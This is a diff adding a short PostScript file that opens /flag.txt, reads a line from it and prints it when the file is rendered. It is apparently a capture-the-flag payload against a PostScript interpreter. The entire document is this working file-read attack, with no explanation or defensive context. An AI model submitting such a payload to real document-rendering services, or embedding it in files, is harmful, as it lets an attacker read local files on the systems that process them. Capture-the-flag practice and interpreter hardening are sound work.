@@ -1,0 +1,6 @@
+%!PS
+/DataFile (/flag.txt) (r) file def
+/buf 1024 string def
+DataFile buf readline
+{ print } if
+showpage
